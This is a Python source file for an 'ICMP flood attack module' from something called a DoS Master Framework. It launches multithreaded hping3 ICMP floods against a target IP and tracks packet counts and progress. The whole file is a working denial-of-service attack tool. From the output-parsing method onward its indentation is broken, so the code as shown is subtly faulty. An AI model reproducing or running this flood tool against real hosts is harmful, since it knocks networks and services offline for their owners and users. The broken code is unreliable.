#!/usr/bin/env python3
"""
DoS Master Framework - ICMP Flood Attack Module
Professional ICMP flood implementation
"""

import subprocess
import threading
import time
import socket
import struct
from typing import Dict, Any
from datetime import datetime

class ICMPFlood:
    """ICMP flood attack implementation"""
    
    def __init__(self, config: Dict, logger):
        self.config = config
        self.logger = logger
        self.target = config['target']
        self.duration = config.get('duration', 60)
        self.threads = config.get('threads', 5)
        self.packet_size = config.get('payload_size', 1024)
        self.rate_limit = config.get('rate', 0)
        self.dry_run = config.get('dry_run', False)
        
        self.packets_sent = 0
        self.packets_failed = 0
        self.attack_active = False
        self.start_time = None
        self.worker_threads = []
        
    def validate_config(self) -> bool:
        """Validate attack configuration"""
        try:
            # Validate target IP
            socket.inet_aton(self.target)
            
            # Validate parameters
            if self.duration <= 0 or self.duration > 3600:
                self.logger.error("Duration must be between 1 and 3600 seconds")
                return False
                
            if self.threads <= 0 or self.threads > 100:
                self.logger.error("Threads must be between 1 and 100")
                return False
                
            if self.packet_size < 8 or self.packet_size > 65507:
                self.logger.error("Packet size must be between 8 and 65507 bytes")
                return False
            
            return True
            
        except socket.error:
            self.logger.error(f"Invalid target IP address: {self.target}")
            return False
    
    def execute(self) -> Dict[str, Any]:
        """Execute ICMP flood attack"""
        self.logger.info(f"Starting ICMP flood attack against {self.target}")
        
        if self.dry_run:
            return self._simulate_attack()
        
        self.attack_active = True
        self.start_time = time.time()
        
        try:
            # Start worker threads
            for i in range(self.threads):
                thread = threading.Thread(target=self._icmp_worker, args=(i,))
                thread.start()
                self.worker_threads.append(thread)
                time.sleep(0.1)  # Stagger thread starts
            
            # Monitor attack progress
            self._monitor_attack()
            
            # Wait for all threads to complete
            for thread in self.worker_threads:
                thread.join()
            
            # Calculate results
            end_time = time.time()
            actual_duration = end_time - self.start_time
            avg_rate = self.packets_sent / actual_duration if actual_duration > 0 else 0
            
            result = {
                'attack_type': 'icmp_flood',
                'target': self.target,
                'duration': actual_duration,
                'packets_sent': self.packets_sent,
                'packets_failed': self.packets_failed,
                'success_rate': (self.packets_sent / (self.packets_sent + self.packets_failed)) * 100 if (self.packets_sent + self.packets_failed) > 0 else 0,
                'avg_rate': avg_rate,
                'threads_used': self.threads,
                'packet_size': self.packet_size,
                'timestamp': datetime.now().isoformat()
            }
            
            self.logger.info(f"ICMP flood completed: {self.packets_sent} packets sent")
            return result
            
        except Exception as e:
            self.logger.error(f"ICMP flood attack failed: {e}")
            raise
        finally:
            self.attack_active = False
    
    def _icmp_worker(self, worker_id: int):
        """ICMP flood worker thread"""
        self.logger.debug(f"ICMP worker {worker_id} started")
        
        try:
            # Use hping3 for reliable ICMP flooding
            cmd = [
                'hping3',
                '--icmp',
                '--flood',
                '-d', str(self.packet_size),
                self.target
            ]
            
            if self.rate_limit > 0:
                # Calculate interval for rate limiting
                interval = int(1000000 / (self.rate_limit / self.threads))  # microseconds
                cmd.extend(['-i', f'u{interval}'])
            
            # Start hping3 process
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Monitor process
            start_time = time.time()
            while self.attack_active and (time.time() - start_time) < self.duration:
                if process.poll() is not None:
                    break
                time.sleep(0.1)
            
            # Terminate process
            if process.poll() is None:
                process.terminate()
                process.wait(timeout=5)
            
            # Parse results from hping3 output
            stdout, stderr = process.communicate()
            self._parse_hping_output(stdout, worker_id)
            
        except Exception as e:
            self.logger.error(f"ICMP worker {worker_id} failed: {e}")
            
        self.logger.debug(f"ICMP worker {worker_id} completed")
    
    def _parse_hping_output(self, output: str, worker_id: int):
        """Parse hping3 output to extract statistics"""
        try:
            lines = output.split('\n')
            for line in lines:
               if 'packets transmitted' in line:
                   # Extract packet count from hping3 statistics
                   parts = line.split()
                   if len(parts) >= 3:
                       packets = int(parts[0])
                       self.packets_sent += packets
                       self.logger.debug(f"Worker {worker_id}: {packets} packets sent")
                       break
       except Exception as e:
           self.logger.debug(f"Failed to parse hping output: {e}")
   
   def _monitor_attack(self):
       """Monitor attack progress"""
       while self.attack_active:
           elapsed = time.time() - self.start_time if self.start_time else 0
           remaining = max(0, self.duration - elapsed)
           
           if elapsed > 0:
               current_rate = self.packets_sent / elapsed
               self.logger.info(f"ICMP flood progress: {elapsed:.1f}s elapsed, "
                              f"{self.packets_sent} packets sent, "
                              f"{current_rate:.1f} pps, "
                              f"{remaining:.1f}s remaining")
           
           if remaining <= 0:
               self.attack_active = False
               break
               
           time.sleep(5)
   
   def _simulate_attack(self) -> Dict[str, Any]:
       """Simulate attack for dry-run mode"""
       self.logger.info("Simulating ICMP flood attack (dry-run mode)")
       
       # Simulate attack metrics
       estimated_packets = self.threads * 1000 * self.duration  # Rough estimate
       
       time.sleep(2)  # Brief simulation delay
       
       return {
           'attack_type': 'icmp_flood',
           'target': self.target,
           'duration': self.duration,
           'packets_sent': estimated_packets,
           'packets_failed': 0,
           'success_rate': 100.0,
           'avg_rate': estimated_packets / self.duration,
           'threads_used': self.threads,
           'packet_size': self.packet_size,
           'timestamp': datetime.now().isoformat(),
           'dry_run': True
       }
   
   def stop(self):
       """Stop the attack"""
       self.logger.info("Stopping ICMP flood attack")
       self.attack_active = False
   
   def get_status(self) -> Dict[str, Any]:
       """Get current attack status"""
       elapsed = time.time() - self.start_time if self.start_time else 0
       current_rate = self.packets_sent / elapsed if elapsed > 0 else 0
       
       return {
           'attack_type': 'icmp_flood',
           'active': self.attack_active,
           'elapsed_time': elapsed,
           'packets_sent': self.packets_sent,
           'current_rate': current_rate,
           'threads_active': len([t for t in self.worker_threads if t.is_alive()])
       }